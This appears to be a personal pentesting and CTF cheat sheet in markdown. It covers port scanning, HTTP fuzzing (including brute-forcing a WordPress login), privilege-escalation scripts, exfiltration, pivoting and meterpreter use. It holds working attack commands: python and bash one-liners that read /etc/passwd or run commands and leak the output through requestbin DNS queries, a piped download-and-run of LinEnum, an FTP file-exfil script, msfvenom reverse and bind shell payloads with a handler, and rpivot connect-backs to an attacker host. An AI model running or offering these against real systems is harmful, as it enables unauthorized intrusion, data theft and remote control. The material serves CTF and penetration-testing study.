# Enumeration

Useful host enumeration snippets for boot2root-style CTFs.

## Remote Host Enumeration

### Port Scans

Usually the best first step is to run some port scans, at least on the common ports.

Shameless plug, to automate all of your initial recon needs, check out my project [bscan](https://github.com/welchbj/bscan):
```sh
export HOST=scanme.nmap.org
/opt/bscan --max-concurrency 5 $HOST
```

If you choose not to see the light, these Nmap snippets will prove useful (`-sT` used for speed; in real-life scenarios, use TCP SYN scanning with `-sS`):
```sh
export HOST=scanme.nmap.org

# quick TCP port scan on common ports
nmap -vv -n -Pn -sT -sV -sC --top-ports 1000 -oN $'nmap.tcp.quick.'${HOST}$'.'$(date -Iseconds) $HOST

# thorough and complete TCP port scan on all ports
nmap -vv -n -Pn -sT -sV -sC -p- -oN $'nmap.tcp.thorough.'${HOST}$'.'$(date -Iseconds) $HOST

# UDP scan
nmap -vv -n -Pn -sV -sC -sU -oN $'nmap.udp.'${HOST}$'.'$(date -Iseconds) $HOST
```

### HTTP Enumeration

#### Directory Scanning

[`gobuster`](https://github.com/OJ/gobuster) is the go-to tool for HTTP directory enumeration. Here's a good standard one-liner to get started:
```sh
export URL=http://scanme.nmap.org/
/opt/gobuster dir --useragent 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36' -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 32 -u $URL | tee $'gobuster.'$(date -Iseconds)
```

Don't forget to add `-x php,xhtml`-style arguments based on any determined common file extensions.

If you just want to look for some quick-and-easy wins, this `curl` snippet will get you started:
```sh
export URL=http://scanme.nmap.org
for path in robots.txt sitemap.xml security.txt .git/HEAD; do curl -vv -A 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36' $URL/$path; done
```

#### Web Application Firewall (WAF) Detection

[wafw00f](https://github.com/EnableSecurity/wafw00f) should be your go-to tool for WAF detection and fingerprinting. It has pretty straightforward usage:
```sh
export URL=http://scanme.nmap.org
wafw00f $URL
```

#### Fuzzing HTTP Parameters and Fields

Your friends for HTTP fuzzing wordlists will be the [SecLists](https://github.com/danielmiessler/SecLists) and [FuzzDB](https://github.com/fuzzdb-project/fuzzdb) projects. The best open source HTTP fuzzing engine that I know of is the [wfuzz project](https://github.com/xmendez/wfuzz). Here are some useful snippets combining these two awesome projects:

```sh
export URL=http://scanme.nmap.org

# fuzzing a URL parameter
wfuzz -c -z file,/opt/SecLists/Fuzzing/special-chars.txt -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36' --hc 404 $URL/FUZZ

# fuzzing the user-agent; -H works for any other header, too
wfuzz -c -z file,/opt/SecLists/Fuzzing/User-Agents/UserAgents.fuzz.txt -H 'User-Agent: FUZZ' --hc 403,404  $URL

# fuzzing a POST login form with multiple parameters
wfuzz -c -z file,/opt/fuzzdb/wordlists-user-passwd/names/namelist.txt -z file,/opt/fuzzdb/wordlists-user-passwd/passwds/john.txt -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36' -d 'username=FUZZ&password=FUZ2Z' --hc 403 $URL/wp-login.php

# fuzzing HTTP verbs
wfuzz -c -z file,/opt/fuzzdb/attack/http-protocol/http-protocol-methods.txt -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36' -X FUZZ --hc 403 $URL
```

## Local Host Enumeration

This section goes over some automated methods. For manual checks, take a look at [my other pentesting snippet reference](https://pages.brianwel.ch/hacks).

### Automated Scripts

Projects like [LinEnum](https://github.com/rebootuser/LinEnum) are great for automating tedious privilege escalation checks. Here is a snippet for downloading and running from the public web:
```sh
curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
```

### Process Watching

A lot of information can be gleaned by watching changes to [procfs](https://en.wikipedia.org/wiki/Procfs). An amazing tool for automating this is [`pspy`](https://github.com/DominicBreuker/pspy). Here are some snippets for transferring it to target and executing:
```sh
TODO
```

## File Exfiltration

### DNS Exfiltration

When outbound rules from a target are restrictive, it may still be possible to exfiltrate data via DNS. The awesome site [requestbin.net](requestbin.net) has support for [receiving DNS queries](http://requestbin.net/dns), too. By encoding the data-to-exfil within the subdomain field of a domain we control (through a service like requestbin), we can send pretty much data back to ourselves. requestbin alternatives include:

* [DNSBin](http://dnsbin.zhack.ca)

These concepts are based on [this writeup from Insomnihack Teaser 2020](https://ctftime.org/writeup/17998). I present below a proof-of-concept DNS exfiltration protocol with the following fields:

* N-byte 0-indexed sequence number
* 2-byte session
* N-byte data field
* The remainer of the requestbin domain (something like `.bf6c4b6d8f1b164d5c4d.d.requestbin.net`)

Some restrictions are inherited from the DNS specification:

* Each label (i.e., `www` and `company` from `www.company.com`) cannot exceed 63 characters
* The total length of the domain cannot exceed 253 characters

The below one-liners provide mechanisms of generating a `/tmp/resolveme` file that encodes the desired payload into a series of domains that use this basic protocol. The only step that remains after generating this file is to execute the DNS queries that create the exfiltration traffic. Take note that these one-liners also generate the session bytes inline; if space is at a premium, you can do this offline and harcode it in the commands. Another implementation of the below snippets is that they provide a 5-character space for the sequence number; exfils involving larger sequences may have to adjust this logic.

```sh
# python 2/3 file read with compression; use `./python3-dns-bin-retriever -d zlib -t TOKEN` to retrieve this
python -c "s='.%02x'%__import__('random').getrandbits(8);d='.8f85be7ebfc30f73ebe5.d.requestbin.net';open('/tmp/resolveme','w').write('\n'.join(str(i)+s+'.'+x+d for i,x in enumerate(__import__('textwrap').fill(__import__('binascii').hexlify(__import__('zlib').compress(open('/etc/passwd','rb').read())).decode(),min(63,245-len(s)-len(d))).splitlines())))"

# python 2/3 command exec with compression; use `./python3-dns-bin-retriever -d zlib -t TOKEN` to retrieve this
python3 -c "s='.%02x'%__import__('random').getrandbits(8);d='.e004d291fe96f8880232.d.requestbin.net';open('/tmp/resolveme','w').write('\n'.join(str(i)+s+'.'+x+d for i,x in enumerate(__import__('textwrap').fill(__import__('binascii').hexlify(__import__('zlib').compress(__import__('subprocess').check_output('ls -la 2>&1',shell=True))).decode(),min(63,245-len(s)-len(d))).splitlines())))"

# bash file read with compression; use `./python3-dns-bin-retriever -d gzip -t TOKEN` to retrieve this
rm /tmp/resolveme; d='.17ccedcf3f3294a6cbcc.d.requestbin.net';i=0;sess=$(xxd -l 1 -p /dev/urandom); <data.txt gzip -c | xxd -c 31 -p | while read l; do echo $i.$sess.$l$d >> /tmp/resolveme; let i++; done
```

And then sending that data from the target to your dnsbin listener:

```sh
# dig name resolution
dig -f /tmp/resolveme

# nslookup name resolution
while read d; do nslookup $d; done </tmp/resolveme
```

While data can be manually retrieved and decoded/decompressed from requestbin, it might be useful to setup an automated retriever. See my [dnsbin retriever](../scripts/exfil/python3-dnsbin-retriever.py) script for a ready-to-go solution.

### HTTP File Exfiltration

A convenient method of transferring back to yourself is through HTTP POSTs using an existing HTTP client like `curl`. This can also be paired with a service like [ngrok](https://ngrok.com/) if you just want to transfer files over the public internet.

#### Server-side

Using PHP's `-S` standalone server mode, it is pretty simple to accept client file-upload requests. More information about the PHP builtin web server available [here](https://www.php.net/manual/en/features.commandline.webserver.php). You can grab a copy of my POSTed-file-accepting PHP server in the [`scripts/web`](../scripts/web) directory.

#### Client-side

Uploading files with POST requests can be achieved in a variety of ways:

```sh
# curl
TODO

# python 2
TODO

# python 3
TODO
```

### FTP File Exfiltration

#### Pushing

TODO

#### Pulling

If you can reach a target that has an FTP server, you probably want those files. In the event you are trying to exfil from a host that does not have a native FTP client, but has Python, the following script provides a solution:

```python
import sys
from ftplib import FTP

HOST = '10.10.10.10'
USER, PASS = 'anonymous', 'anonymous@'

FILES_TO_EXFIL = [
    'secret-data.txt',
    'another-script.py',
]

ftp = FTP(HOST)
ftp.login(USER, PASS)
ftp.retrlines('LIST')

for f in FILES_TO_EXFIL:
    sys.stdout.write(ftp.retrbinary('RETR ' + f, open(f, 'wb').write) + '\n')

ftp.quit()
```

You might want to turn this script into a one-line shell command. If so, check out [my one-liner-izing script](../scripts/encoding/any-python-one-liner-ize.py).

## Pivoting

### Meterpreter Techniques

#### Generating payloads

Here are some snippets for generating common meterpreter payloads:

```sh
export LISTEN_IP='10.10.10.10'
export LISTEN_PORT='443'

# linux 64-bit reverse shell meterpreter
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$LISTEN_IP LPORT=$LISTEN_PORT -f elf > "reverse-shell_x86-64_${LISTEN_IP}_${LISTEN_PORT}.elf"

# linux 32-bit reverse shell meterpreter
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$LISTEN_IP LPORT=$LISTEN_PORT -f elf > "reverse-shell_x86_${LISTEN_IP}_${LISTEN_PORT}.elf"

# linux 64-bit bind shell meterpreter
msfvenom -p linux/x64/meterpreter/bind_tcp LHOST=0.0.0.0 LPORT=$LISTEN_PORT -f elf > "bind-shell_x86-64_${LISTEN_PORT}.elf"

# linux 32-bit bind shell meterpreter
msfvenom -p linux/x86/meterpreter/bind_tcp LHOST=0.0.0.0 LPORT=$LISTEN_PORT -f elf > "bind-shell_x86_${LISTEN_PORT}.elf"

# windows 64-bit reverse shell meterpreter
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$LISTEN_IP LPORT=$LISTEN_PORT -f exe > "reverse-shell_x86-64_${LISTEN_IP}_${LISTEN_PORT}.exe"

# windows 32-bit reverse shell meterpreter
msfvenom -p windows/x86/meterpreter/reverse_tcp LHOST=$LISTEN_IP LPORT=$LISTEN_PORT -f exe > "reverse-shell_x86_${LISTEN_IP}_${LISTEN_PORT}.exe"

# windows 64-bit bind shell meterpreter
msfvenom -p windows/x64/meterpreter/bind_tcp LHOST=0.0.0.0 LPORT=$LISTEN_PORT -f exe > "bind-shell_x86-64_${LISTEN_PORT}.exe"

# windows 32-bit bind shell meterpreter
msfvenom -p windows/x86/meterpreter/bind_tcp LHOST=0.0.0.0 LPORT=$LISTEN_PORT -f exe > "bind-shell_x86_${LISTEN_PORT}.exe"
```

When ready, set up a meterpreter listener/connector using something like the following metasploit commands:

```
use exploit/multi/handler
set payload windows/x64/meterpreter/bind_tcp
set LHOST 10.10.10.88
set LPORT 443
run -j
```

#### Routing through Sessions

If you have a meterpreter session on a jump point in the network, you can have tools implicitly route their traffic through that point by adding a routing rule in metasploit:

```sh
# make traffic to the 10.10.10.0/24 subnet route through session 1
route add 10.10.10.0/24 1
```

### Scanning the Subnet

#### Ping Scans

If you don't care about being too loud, this `ping` snippet is a quick-and-dirty way of detecting adjacent hosts on your subnet:

```sh
export SUBNET=192.168.33
for i in {1..254}; do (ping $SUBNET.$i -c 1 -w 5  >/dev/null && echo "$SUBNET.$i" &); done
```

#### Meterpreter Port Scanning

For TCP port scans from a meterpreter session, use the following:

```
use auxiliary/scanner/portscan/tcp
set rhosts 10.10.10.10
set ports 1-65535
```

This is especially useful when routing through existing meterpreter sessions.

### Proxying Around

#### Port Forwarding

TODO: normal ssh portforwards

#### SOCKS Proxying

TODO

#### Reverse SOCKS Proxying

TODO: OpenSSH 7.6+ `ssh -R`

Sometimes you end up on a box without credentials or any other of "forward" dynamic-proxying through it (through traditional `ssh -D` methods). In these cases, the [rpivot](https://github.com/klsecservices/rpivot) project is insanely useful. Think of it like a "reverse" `ssh -D`.

It uses a client-server architecture, and only supports Python 2.6/2.7. On your attack machine, download and run the server:

```sh
# download and package both the client and server into a zip file; allows for easier deployment
cd /opt && git clone https://github.com/klsecservices/rpivot && cd rpivot
zip rpivot.zip -r *.py ./ntlm_auth/

# run the server on your attack machine
python rpivot.zip server --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 9050
```

Then transfer the built `rpivot.zip` file to the target and connect the client back to the server:

```sh
# connect back to attacker-controlled server at 10.10.10.10
python rpivot.zip client --server-ip 10.10.10.10 --server-port 9999
```

You should now be able to use `proxychains` (or another SOCKS4 proxy client) to tunnel through the machine where you ran the client.

If you need to deploy the `rpivot` client to a target without Python, compile it into a standalone binary with [PyInstaller](https://www.pyinstaller.org/):

```sh
cd /opt/rpivot
pyinstaller -F client.py
file dist/client
```

The same can be done with the server, if necessary.

### Spraying Creds

#### SMB

TODO: cme

#### SSH

TODO: hydra? medusa?
